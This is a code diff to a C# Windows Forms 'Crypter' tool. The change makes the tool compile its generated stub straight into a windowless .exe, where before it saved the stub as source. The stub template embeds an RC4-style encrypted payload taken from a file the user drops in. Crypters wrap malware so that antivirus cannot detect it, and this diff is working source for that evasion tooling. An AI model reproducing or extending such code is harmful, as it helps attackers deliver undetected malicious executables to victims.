@@ -1,10 +1,13 @@
 ﻿using System;
+using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Reflection;
 using System.Text;
 using System.Windows.Forms;
 using Crypter.Properties;
+using Microsoft.CSharp;
 using Microsoft.VisualBasic.CompilerServices;
 
 namespace Crypter
@@ -41,12 +44,12 @@ namespace Crypter
             string contents = Resources.String1.Replace("lol", Conversions.ToString(this.Brc4(b))).Replace("kkkkk", Randomstring);
             using (SaveFileDialog saveFile = new SaveFileDialog())
             {
-                saveFile.Filter = "Source Code (*.cs)|*.cs";
+                saveFile.Filter = "File (*.exe)|*.exe";
 
                 if (saveFile.ShowDialog() == DialogResult.OK)
                 {
-                    File.WriteAllText(saveFile.FileName, contents);
-                }
+					Compiler(new string[] { "System.dll", "System.Core.dll", "System.Management.dll" }, contents, saveFile.FileName);
+				}
             }
         }
         public object Brc4(byte[] b2)
@@ -124,5 +127,35 @@ namespace Crypter
                 e.Effect = DragDropEffects.Link;
             else e.Effect = DragDropEffects.None;
         }
-    }
+
+		public static void Compiler(string[] referencedAssemblies, string sourceCode,string path)
+		{
+			var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
+
+			var compilerOptions = "/platform:anycpu /optimize+ /target:winexe";
+
+			using (var cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
+			{
+				var compilerParameters = new CompilerParameters(referencedAssemblies)
+				{
+					GenerateExecutable = true,
+					GenerateInMemory = false,
+					CompilerOptions = compilerOptions,
+					TreatWarningsAsErrors = false,
+					IncludeDebugInformation = false,
+					OutputAssembly = path
+				};
+
+				var compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, sourceCode);
+				if (compilerResults.Errors.Count > 0)
+				{
+					StringBuilder sb = new StringBuilder();
+					foreach (CompilerError compilerError in compilerResults.Errors)
+						sb.AppendLine(
+							$"{compilerError.ErrorText}\nLine: {compilerError.Line} - Column: {compilerError.Column}\nFile: {compilerError.FileName}");
+					MessageBox.Show(sb.ToString());
+				}
+			}
+		}
+	}
 }
